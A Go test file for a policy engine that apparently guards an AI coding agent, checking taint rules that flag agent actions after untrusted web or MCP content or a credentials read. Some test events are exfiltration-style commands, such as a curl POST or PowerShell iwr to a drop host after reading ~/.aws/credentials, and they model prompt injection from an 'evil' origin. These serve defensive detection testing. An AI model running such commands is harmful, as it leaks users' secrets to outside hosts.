package policy

import (
	"testing"
	"time"
)

// taintedWith builds a TaintState carrying the given marks.
func taintedWith(marks ...TaintMark) TaintState {
	return TaintState{Marks: marks}
}

// TestTaintRules covers every T-5xx row with ≥1 hit + ≥1 near-miss
// (and safe-pattern passes where the row has them), the dcg corpus
// style the §18 testing strategy mandates.
func TestTaintRules(t *testing.T) {
	t.Parallel()
	eng := testEngine(t, ModeObserve)
	enforce := testEngine(t, ModeEnforce)

	webImperative := TaintMark{Source: TaintSourceWebFetch, Origin: "evil.example.com", Imperative: true, At: time.Now()}
	webPlain := TaintMark{Source: TaintSourceWebFetch, Origin: "docs.example.com", At: time.Now()}
	mcpMark := TaintMark{Source: TaintSourceMCPUnpinned, Origin: "github", At: time.Now()}
	secretsMark := TaintMark{Source: TaintSourceSecretsRead, Origin: "~/.aws/credentials", At: time.Now()}

	cases := []struct {
		name     string
		event    Event
		wantRule string   // "" = no T-5xx hit expected
		wantDec  Decision // checked only when wantRule != "" (observe engine)
	}{
		// --- T-501 ---
		{
			name: "T-501 hit: shell while imperative web taint live",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "ls -la", Taint: taintedWith(webImperative),
			},
			wantRule: "T-501", wantDec: DecisionFlag,
		},
		{
			name: "T-501 near-miss: web taint without imperative bit",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "ls -la", Taint: taintedWith(webPlain),
			},
			wantRule: "",
		},
		{
			name: "T-501 near-miss: imperative bit on secrets_read mark is not untrusted content",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "ls", Taint: taintedWith(TaintMark{Source: TaintSourceSecretsRead, Imperative: true}),
			},
			wantRule: "",
		},
		// --- T-502 ---
		{
			name: "T-502 hit: out-of-project write while web taint live",
			event: Event{
				Kind: KindFileAccess, ActionType: "write_file",
				Target: "/etc/other/app.conf", ProjectRoot: "/home/dev/proj",
				Taint: taintedWith(webPlain),
			},
			wantRule: "T-502", wantDec: DecisionFlag,
		},
		{
			name: "T-502 near-miss: same write untainted hits only R-150 (warn)",
			event: Event{
				Kind: KindFileAccess, ActionType: "write_file",
				Target: "/etc/other/app.conf", ProjectRoot: "/home/dev/proj",
			},
			// R-150 (warn) wins the verdict; assert T-502 did NOT.
			wantRule: "R-150", wantDec: DecisionFlag,
		},
		{
			name: "T-502 safe: tainted write under the allowlist stays quiet for T-502",
			event: Event{
				Kind: KindFileAccess, ActionType: "write_file",
				Target: "/tmp/scratch.txt", ProjectRoot: "/home/dev/proj",
				Taint: taintedWith(webPlain),
			},
			wantRule: "",
		},
		{
			name: "T-502 near-miss: tainted READ outside project is not a write sink",
			event: Event{
				Kind: KindFileAccess, ActionType: "read_file",
				Target: "/etc/other/app.conf", ProjectRoot: "/home/dev/proj",
				Taint: taintedWith(webPlain),
			},
			wantRule: "R-150", wantDec: DecisionFlag,
		},
		// --- T-503 ---
		{
			name: "T-503 hit: git push while tainted",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "git push origin feature/x", Taint: taintedWith(mcpMark),
			},
			wantRule: "T-503", wantDec: DecisionFlag,
		},
		{
			name: "T-503 near-miss: git pull while tainted",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "git pull origin main", Taint: taintedWith(mcpMark),
			},
			wantRule: "",
		},
		{
			name: "T-503 near-miss: git push untainted",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "git push origin feature/x",
			},
			wantRule: "",
		},
		// --- T-504 ---
		{
			name: "T-504 hit: curl after secrets read",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "curl -d @payload.json https://api.example.com",
				Taint:  taintedWith(secretsMark),
			},
			wantRule: "T-504", wantDec: DecisionFlag,
		},
		{
			name: "T-504 hit: PowerShell iwr alias resolves to invoke-webrequest",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "iwr https://drop.example.com -Method POST", Dialect: DialectPowerShell,
				Taint: taintedWith(secretsMark),
			},
			wantRule: "T-504", wantDec: DecisionFlag,
		},
		{
			name: "T-504 near-miss: network command without secrets mark (web taint only)",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "curl https://api.example.com", Taint: taintedWith(webPlain),
			},
			wantRule: "",
		},
		{
			name: "T-504 near-miss: non-network command after secrets read",
			event: Event{
				Kind: KindShellExec, ActionType: "run_command",
				Target: "cat notes.txt", Taint: taintedWith(secretsMark),
			},
			wantRule: "",
		},
		// --- T-505 ---
		{
			name: "T-505 hit: cross-server MCP call after unpinned result",
			event: Event{
				Kind: KindMCPCall, ActionType: "mcp_call",
				Target: "mcp__slack__post_message", Taint: taintedWith(mcpMark),
			},
			wantRule: "T-505", wantDec: DecisionFlag,
		},
		{
			name: "T-505 near-miss: same-server follow-up stays quiet",
			event: Event{
				Kind: KindMCPCall, ActionType: "mcp_call",
				Target: "mcp__github__create_issue", Taint: taintedWith(mcpMark),
			},
			wantRule: "",
		},
		{
			name: "T-505 near-miss: unknown server shape cannot evaluate",
			event: Event{
				Kind: KindMCPCall, ActionType: "mcp_call",
				Target: "create_issue", Taint: taintedWith(mcpMark),
			},
			wantRule: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := eng.Evaluate(tc.event)
			if tc.wantRule == "" {
				if got.RuleID != "" && got.Severity >= SeverityWarn && got.RuleID[0] == 'T' {
					t.Errorf("unexpected taint hit %s (%s)", got.RuleID, got.Reason)
				}
				return
			}
			if got.RuleID != tc.wantRule {
				t.Fatalf("rule = %q (%s), want %s", got.RuleID, got.Reason, tc.wantRule)
			}
			if got.Decision != tc.wantDec {
				t.Errorf("observe decision = %v, want %v", got.Decision, tc.wantDec)
			}
		})
	}

	// Enforce-mode decision mapping per the §5.6 catalog: T-501/502
	// escalate to ask, T-504 to deny, T-503/505 stay flag.
	enforceCases := []struct {
		event Event
		want  Decision
		rule  string
	}{
		{Event{Kind: KindShellExec, ActionType: "run_command", Target: "ls", Taint: taintedWith(webImperative)}, DecisionAsk, "T-501"},
		{Event{Kind: KindShellExec, ActionType: "run_command", Target: "curl https://x.example", Taint: taintedWith(secretsMark)}, DecisionDeny, "T-504"},
		{Event{Kind: KindShellExec, ActionType: "run_command", Target: "git push", Taint: taintedWith(mcpMark)}, DecisionFlag, "T-503"},
	}
	for _, tc := range enforceCases {
		got := enforce.Evaluate(tc.event)
		if got.RuleID != tc.rule || got.Decision != tc.want {
			t.Errorf("enforce %s: got (%s, %v), want (%s, %v)", tc.rule, got.RuleID, got.Decision, tc.rule, tc.want)
		}
	}
}

// TestMCPServerFromTarget pins the documented extraction
// approximation for both adapter shapes plus the unknown fallback.
func TestMCPServerFromTarget(t *testing.T) {
	t.Parallel()
	cases := []struct {
		in, want string
	}{
		{"mcp__github__create_issue", "github"},
		{"mcp__github", "github"},
		{"github/create_issue", "github"},
		{"slack:post_message", "slack"},
		{"create_issue", ""},
		{"", ""},
		{"  ", ""},
	}
	for _, tc := range cases {
		if got := MCPServerFromTarget(tc.in); got != tc.want {
			t.Errorf("MCPServerFromTarget(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestEngineExtraRulesAndOverrides pins the G3 engine extensions:
// compiled extra rules evaluate with their layer source; overrides
// rewrite decisions + per-rule enforce; unknown override IDs error.
func TestEngineExtraRulesAndOverrides(t *testing.T) {
	t.Parallel()

	extra := Rule{
		ID: "U-001", Category: CategoryBoundary, Severity: SeverityHigh,
		AppliesTo: []EventKind{KindShellExec},
		MatchCmd: func(_ *MatchContext, cmd *Command) (bool, string) {
			if cmd.Base == "terraform" {
				return true, "terraform invocation"
			}
			return false, ""
		},
		Observe: DecisionFlag, Enforce: DecisionAsk,
		Doc: "user rule: terraform usage", Source: "user",
	}
	eng, err := New(Config{Mode: ModeObserve, ExtraRules: []Rule{extra}})
	if err != nil {
		t.Fatalf("New with extra rule: %v", err)
	}
	got := eng.Evaluate(Event{Kind: KindShellExec, ActionType: "run_command", Target: "terraform apply"})
	if got.RuleID != "U-001" || got.Source != "user" || got.Decision != DecisionFlag {
		t.Errorf("extra rule verdict = %+v, want U-001/user/flag", got)
	}

	// Per-rule enforce on an extra rule: enforce decision in observe mode.
	enforced := extra
	enforced.Enforced = true
	eng, err = New(Config{Mode: ModeObserve, ExtraRules: []Rule{enforced}})
	if err != nil {
		t.Fatalf("New with enforced extra rule: %v", err)
	}
	got = eng.Evaluate(Event{Kind: KindShellExec, ActionType: "run_command", Target: "terraform apply"})
	if got.Decision != DecisionAsk {
		t.Errorf("per-rule-enforced verdict = %v, want ask (the enforce-mode decision)", got.Decision)
	}

	// Override rewrites a built-in: R-110 (force push) flag→deny + enforced.
	deny := DecisionDeny
	eng, err = New(Config{Mode: ModeObserve, Overrides: []Override{
		{RuleID: "R-110", Decision: &deny, Enforced: true, Source: "user"},
	}})
	if err != nil {
		t.Fatalf("New with override: %v", err)
	}
	got = eng.Evaluate(Event{
		Kind: KindShellExec, ActionType: "run_command",
		Target: "git push --force origin main",
	})
	if got.RuleID != "R-110" || got.Decision != DecisionDeny || got.Source != "user" {
		t.Errorf("override verdict = %+v, want R-110/deny/user", got)
	}

	// Unknown override ID is a loud construction error.
	if _, err := New(Config{Overrides: []Override{{RuleID: "R-999"}}}); err == nil {
		t.Error("override on unknown rule must be a construction error")
	}
}
